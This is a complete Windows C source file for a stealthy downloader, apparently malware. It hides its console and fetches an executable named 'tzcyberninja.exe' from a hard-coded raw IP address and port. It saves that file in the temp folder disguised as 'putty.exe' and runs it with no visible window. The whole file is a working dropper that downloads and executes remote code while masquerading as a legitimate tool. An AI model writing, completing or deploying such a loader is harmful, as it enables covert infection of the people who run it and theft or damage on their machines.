#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")


DWORD WINAPI BackgroundDownload(LPVOID lpParam) {
    const char* url = "http://165.227.81.186:90/tzcyberninja.exe";
    char tempPath[MAX_PATH];
    char filePath[MAX_PATH];

    GetTempPathA(MAX_PATH, tempPath);
    snprintf(filePath, MAX_PATH, "%sputty.exe", tempPath);

    HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return 1;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    HANDLE hOutFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    BYTE buffer[4096];
    DWORD bytesRead, bytesWritten;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        WriteFile(hOutFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hOutFile);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    // Run putty silently
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessA(filePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window (just in case)
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);

    // Run thread and wait for it
    HANDLE hThread = CreateThread(NULL, 0, BackgroundDownload, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    return 0;
}
